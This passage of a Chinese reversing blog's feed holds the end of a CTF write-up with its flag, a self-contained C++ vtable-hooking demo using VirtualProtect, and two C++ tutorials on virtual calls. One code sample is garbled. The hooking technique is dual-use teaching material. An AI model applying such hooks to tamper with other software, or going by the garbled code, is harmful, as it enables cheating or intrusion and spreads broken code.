class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.size(); i++)</span><br><span class="line">c[i] = a[i] / b[i];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.size(); i++)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span>)c[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304232917.png" alt="[GUET-CTF2019]re005"></p><p>最离谱的是，这flag是错误的，</p><p>网上搜了一下题解，呵呵，搞人心态，少了一位，爆破得到a7 = 1，这应该是出题失误了。</p><p>实际flag为flag{e165421110b0a3099a1c039337}</p><p>没意思没意思。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DDCTF2018-探寻逝去的Atlantis文明&quot;&gt;&lt;a href=&quot;#DDCTF2018-探寻逝去的Atlantis文明&quot; class=&quot;headerlink&quot; title=&quot;[DDCTF2018]探寻逝去的Atlantis文明&quot;&gt;&lt;/a&gt;[DDCTF2018</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="CTF" scheme="http://0xnope.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>VMT_HOOK</title>
    <link href="http://0xnope.top/2021/03/03/VMT-HOOK/"/>
    <id>http://0xnope.top/2021/03/03/VMT-HOOK/</id>
    <published>2021-03-03T14:12:51.000Z</published>
    <updated>2021-03-14T14:15:51.075Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，如果一个类当中有虚函数，那么这些类的每个对象将在偏移量0x0处包含指向vTable（虚表）的指针，vTable中保存的则是当前类中所有虚函数的函数地址。它只是一个指针数组，对象通过在vTable中找到它们的指针来调用这些函数。要执行vTable挂钩，我们要做的就是用指向自己函数的指针覆盖该指针。在函数的最后，只需调用原始函数即可。</p><p>内存结构图如下：<img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303221558.png" alt="虚函数和虚表的内存分布"></p><p>步骤有三：</p><ol><li>获得虚表指针</li><li>修改虚表的内存保护属性</li><li>修改虚表中的虚函数地址为我们的函数地址</li></ol><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Cat() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat无参构造函数&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Cat() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;~Cat析构函数&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">catSpeak</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;小猫在说话&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">catSinging</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;~~~miao喵&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">catName</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;小猫名字是Tom&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Print&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dogSpeak</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;小狗在说话&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dogSinging</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;~~~wang汪&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dogName</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;小狗名字是Bob&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cat cat;</span><br><span class="line">Cat&amp; obj = cat;<span class="comment">//可以虚调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一步,获取自己的虚表指针</span></span><br><span class="line"><span class="keyword">int</span> dwAddr1 = *(<span class="keyword">int</span>*)&amp;cat;</span><br><span class="line"><span class="keyword">int</span> dwAddr2 = *(<span class="keyword">int</span>*)&amp;cat+<span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> dwAddr3 = *(<span class="keyword">int</span>*)&amp;cat+<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">obj.catSpeak();<span class="comment">//虚函数调用,测试作用</span></span><br><span class="line">obj.catSinging();</span><br><span class="line">obj.catName();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n----------------Hook Starting----------------\n&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//第二步修改虚表指针的内存保护属性,下方更改虚表</span></span><br><span class="line">DWORD dwOld = <span class="number">0x0</span>;</span><br><span class="line">VirtualProtect((LPVOID)dwAddr1,<span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三步,HOOK,也就是将我们的函数地址,写入到虚表中</span></span><br><span class="line">(*(<span class="keyword">int</span>*)dwAddr1) = (<span class="keyword">int</span>)dogSpeak;</span><br><span class="line">(*(<span class="keyword">int</span>*)dwAddr2) = (<span class="keyword">int</span>)dogSinging;</span><br><span class="line">(*(<span class="keyword">int</span>*)dwAddr3) = (<span class="keyword">int</span>)dogName;</span><br><span class="line"></span><br><span class="line">obj.catSpeak();</span><br><span class="line">obj.catSinging();</span><br><span class="line">obj.catName();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303221809.png" alt="VMTHOOK运行结果"></p><p>可以看到，下面我们明明调用的<strong>catSpeak(); catSinging(); catName()</strong>;三个函数，</p><p>但是由于我们将其hook了，最终显示的调用函数是<strong>dogSpeak();</strong> <strong>dogSinging();</strong> <strong>dogName();</strong></p><p>VirtualProtect函数原型如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(  LPVOID lpAddress,<span class="comment">//要更改其访问保护属性的页面区域的起始页面的地址。  </span></span></span></span><br><span class="line"><span class="function"><span class="params">                    SIZE_T dwSize,<span class="comment">//要更改其访问保护属性的区域的大小，以字节为单位  </span></span></span></span><br><span class="line"><span class="function"><span class="params">                    DWORD  flNewProtect,<span class="comment">//内存保护选项。  </span></span></span></span><br><span class="line"><span class="function"><span class="params">                    PDWORD lpflOldProtect<span class="comment">//指向变量的指针，该变量接收页面的指定区域中第一页的先前访问保护值。 </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们知道，如果一个类当中有虚函数，那么这些类的每个对象将在偏移量0x0处包含指向vTable（虚表）的指针，vTable中保存的则是当前类中所有虚函数的函数地址。它只是一个指针数组，对象通过在vTable中找到它们的指针来调用这些函数。要执行vTable挂钩，我们要做的就是</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="C++" scheme="http://0xnope.top/tags/C/"/>
    
    <category term="Hook" scheme="http://0xnope.top/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>C++中的静态绑定和动态绑定</title>
    <link href="http://0xnope.top/2021/03/03/C++%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E7%BB%91%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E7%BB%91%E5%AE%9A/"/>
    <id>http://0xnope.top/2021/03/03/C++%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E7%BB%91%E5%AE%9A%E5%92%8C%E5%8A%A8%E6%80%81%E7%BB%91%E5%AE%9A/</id>
    <published>2021-03-03T12:05:24.000Z</published>
    <updated>2021-03-14T14:15:19.796Z</updated>
    
    <content type="html"><![CDATA[<p>首先需要明确几个名词定义：</p><ul><li>静态类型：对象在声明时采用的类型，在编译时就已经确定，不可更改；</li><li>动态类型：通常是指一个指针或引用目前所指对象的类型，是在运行时决定，可更改；</li><li>静态绑定：绑定的是静态类型，所对应的函数或属性依赖于对象的静态类型，发生在编译期；</li><li>动态绑定：绑定的是动态类型，所对应的函数或属性依赖于对象的动态类型，发生在运行期；</li><li>继承关系会导致对象的指针和引用具有静态类型和动态类型。</li></ul><p>只有虚函数是动态绑定，其他非虚函数都是静态绑定，即编译时就已经确定。</p><p>看看下面的代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A::Print&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A::vfunc&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;B::Print&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;B::vfunc&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C::Print&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C::vfunc&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">C* pc = <span class="keyword">new</span> C();<span class="comment">//pc的静态类型是它声明的类型C*，动态类型也是C*；</span></span><br><span class="line">B* pb = <span class="keyword">new</span> B();<span class="comment">//pb的静态类型是它声明的类型B*，动态类型也是B*；</span></span><br><span class="line">A* pa = pb;<span class="comment">//pa的静态类型是它声明的类型A*，动态类型是pa指向的对象pb的类型B*；</span></span><br><span class="line">C* pnull = <span class="literal">NULL</span>;        <span class="comment">//pnull的静态类型是它声明的类型C*,没有动态类型，因为它指向了NULL；</span></span><br><span class="line"></span><br><span class="line">pb-&gt;Print();</span><br><span class="line">pa-&gt;Print();</span><br><span class="line">pnull-&gt;Print();         <span class="comment">//C::func() 不用奇怪为什么空指针也可以调用函数，因为这在编译期就确定了，和指针空不空没关系；</span></span><br><span class="line"></span><br><span class="line">pb-&gt;vfunc();</span><br><span class="line">pa-&gt;vfunc();</span><br><span class="line"></span><br><span class="line">pa = pc;<span class="comment">//pa的动态类型可以更改，现在它的动态类型是C*，但其静态类型仍是声明时候的A*；</span></span><br><span class="line">pa-&gt;vfunc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><blockquote><p>B::Print</p><p>A::Print</p><p>C::Print</p><p>B::vfunc</p><p>B::vfunc</p><p>C::vfunc</p><p>请按任意键继续. . .</p></blockquote><p>由上代码可以看出：</p><ol><li>对象的动态类型可以更改，但是静态类型无法更改；</li><li>必须使用动态绑定是实现多态的必要前提；</li><li>只有虚函数是动态绑定，其他的全部是静态绑定；</li></ol><p><strong>在动态绑定也即在virtual函数中，要注意默认参数的使用。</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> i = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A::func()\t&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> i = <span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;B::func()\t&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    B* pb = <span class="keyword">new</span> B();</span><br><span class="line">    A* pa = pb;</span><br><span class="line">    pb-&gt;func(); <span class="comment">//B::func() 1  正常，就该如此；</span></span><br><span class="line">    pa-&gt;func(); <span class="comment">//B::func() 0  调用了子类的函数，却使用了基类中参数的默认值！</span></span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建议：</p><ul><li>绝对不要重新定义继承而来的非虚(non-virtual)函数（《Effective C++ 第三版》条款36），因为这样导致函数调用由对象声明时的静态类型确定了，而和对象本身脱离了关系，没有多态，也这将给程序留下不可预知的隐患和莫名其妙的BUG；</li><li>绝对不要重新定义一个继承而来的virtual函数的缺省参数值，因为缺省参数值都是静态绑定（为了执行效率），而virtual函数却是动态绑定。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先需要明确几个名词定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态类型：对象在声明时采用的类型，在编译时就已经确定，不可更改；&lt;/li&gt;
&lt;li&gt;动态类型：通常是指一个指针或引用目前所指对象的类型，是在运行时决定，可更改；&lt;/li&gt;
&lt;li&gt;静态绑定：绑定的是静态类型，所对应的函数</summary>
      
    
    
    
    <category term="C++" scheme="http://0xnope.top/categories/C/"/>
    
    
    <category term="C++" scheme="http://0xnope.top/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>虚函数的实调用和虚调用</title>
    <link href="http://0xnope.top/2021/03/03/%E8%99%9A%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E8%B0%83%E7%94%A8%E5%92%8C%E8%99%9A%E8%B0%83%E7%94%A8/"/>
    <id>http://0xnope.top/2021/03/03/%E8%99%9A%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E8%B0%83%E7%94%A8%E5%92%8C%E8%99%9A%E8%B0%83%E7%94%A8/</id>
    <published>2021-03-03T11:45:54.000Z</published>
    <updated>2021-03-14T14:15:56.992Z</updated>
    
    <content type="html"><![CDATA[<p>​        在发生虚函数调用的时候，如果函数调用的入口是在静态编译阶段就已经确定的话，就是实调用，如果函数入口需要在运行时通过查找虚表获得，就是虚调用，其本质是动态联编。</p><h1 id="实调用的几种情形"><a href="#实调用的几种情形" class="headerlink" title="实调用的几种情形"></a>实调用的几种情形</h1><h2 id="构造函数和析构函数当中调用虚函数"><a href="#构造函数和析构函数当中调用虚函数" class="headerlink" title="构造函数和析构函数当中调用虚函数"></a>构造函数和析构函数当中调用虚函数</h2><p>在构造函数当中调用虚函数，其实是对虚函数的实调用。如何理解？</p><p>因为在一个类的构造函数运行完毕之前，这个对象还没有完全生成，所以在构造函数当中调用虚函数，也只能是实调用父类的那个虚函数罢了。</p><p>同理，销毁一个对象时，运行这个对象的析构函数时，这个对象已经被析构，所以该对象的虚函数也被析构，所以只能实调用其父类的虚函数了。</p><p>示例如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">\<span class="meta">#<span class="meta-keyword">include</span>  using namespace std; </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span> </span><br><span class="line">    <span class="keyword">public</span>: <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in A&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    A() &#123;  </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A构造函数&quot;</span> ; </span><br><span class="line">        show();  </span><br><span class="line">    &#125; </span><br><span class="line">    ~A() &#123;  </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A析构函数&quot;</span> ; </span><br><span class="line">        show();  </span><br><span class="line">    &#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">public</span> A &#123; </span><br><span class="line">    <span class="keyword">public</span>: <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in B&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    A a; B* pb = <span class="keyword">new</span> B(); </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;after new&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    <span class="keyword">delete</span> pb; </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;after delete&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><blockquote><p>A构造函数in A</p><p>A构造函数in A</p><p>after new</p><p>A析构函数in A</p><p>after delete</p><p>A析构函数in A</p></blockquote><h2 id="不通过指针或者引用调用虚函数"><a href="#不通过指针或者引用调用虚函数" class="headerlink" title="不通过指针或者引用调用虚函数"></a>不通过指针或者引用调用虚函数</h2><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span> </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">public</span> A &#123; </span><br><span class="line">    <span class="keyword">public</span>: <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;B&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(A a)</span> </span>&#123; </span><br><span class="line">    a.show(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    B b; </span><br><span class="line">    func(b); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>A</p></blockquote><p>在函数func()中，虽然在class A中函数show()被定义为虚函数，但是a是类A的一个实例，所以函数调用a.show()是实调用，函数的入口地址是在编译阶段静态决定的。</p><p>如果把func函数换成</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(A &amp;a)</span> </span>&#123;</span><br><span class="line">    a.show(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>B</p></blockquote><p>在func函数当中，a是类A的一个引用，将b传进来，这引用就指向B，函数为虚调用，执行B覆写过后的show()函数。</p><h1 id="虚调用"><a href="#虚调用" class="headerlink" title="虚调用"></a>虚调用</h1><p>虚调用最常见的形式是通过指向基类的指针或引用来访问派生类对象的虚函。当通过指针或者引用调用虚函数时，虚函数的指针在编译阶段无法确定，是在运行阶段从虚函数表中的确定位置处获取的。</p><p>示例如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span> </span><br><span class="line">    <span class="keyword">public</span>:    </span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;   </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A&quot;</span>&lt;show(); </span><br><span class="line">        a-&gt;show();  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;B&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B *b = <span class="keyword">new</span> B();</span><br><span class="line">    A *a = <span class="keyword">new</span> B();</span><br><span class="line">    </span><br><span class="line">    b-&gt;show();</span><br><span class="line">    a-&gt;show();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>B</p><p>B</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​        在发生虚函数调用的时候，如果函数调用的入口是在静态编译阶段就已经确定的话，就是实调用，如果函数入口需要在运行时通过查找虚表获得，就是虚调用，其本质是动态联编。&lt;/p&gt;
&lt;h1 id=&quot;实调用的几种情形&quot;&gt;&lt;a href=&quot;#实调用的几种情形&quot; class=</summary>
      
    
    
    
    <category term="C++" scheme="http://0xnope.top/categories/C/"/>
    
    
    <category term="C++" scheme="http://0xnope.top/tags/C/"/>
    
  </entry>
  
</feed>
